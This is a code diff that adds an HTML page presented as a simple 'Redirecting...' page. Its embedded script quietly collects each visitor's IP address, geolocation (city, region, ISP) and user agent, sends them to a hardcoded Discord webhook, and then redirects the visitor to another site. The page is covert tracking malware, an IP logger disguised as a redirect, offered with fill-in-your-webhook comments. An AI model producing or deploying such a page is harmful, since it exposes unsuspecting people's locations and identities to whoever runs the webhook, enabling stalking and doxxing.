@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Replace with your Discord Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
+        const redirectURL = "https://www.genned.net/auth/rdtqx"; // Change to your desired redirect URL
+
+        // Get IP Address & Info
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+
+                // Get more location details
+                fetch(`https://ip-api.com/json/${userIP}`)
+                    .then(response => response.json())
+                    .then(info => {
+                        const userAgent = navigator.userAgent;
+                        const message = {
+                            content: `**New Visitor Logged**\n\n` +
+                                     `**IP Address:** ${userIP}\n` +
+                                     `**Country:** ${info.country}\n` +
+                                     `**Region:** ${info.regionName}\n` +
+                                     `**City:** ${info.city}\n` +
+                                     `**ISP:** ${info.isp}\n` +
+                                     `**User-Agent:** ${userAgent}`
+                        };
+
+                        // Send data to Discord Webhook
+                        fetch(webhookURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(message)
+                        });
+                    })
+                    .catch(error => console.error("Error getting location data:", error));
+            })
+            .catch(error => console.error("Error getting IP address:", error));
+
+        // Instantly redirect the user
+        window.location.href = redirectURL;
+    </script>
+</head>
+<body>
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://example.com">
+    </noscript>
+</body>
+</html>
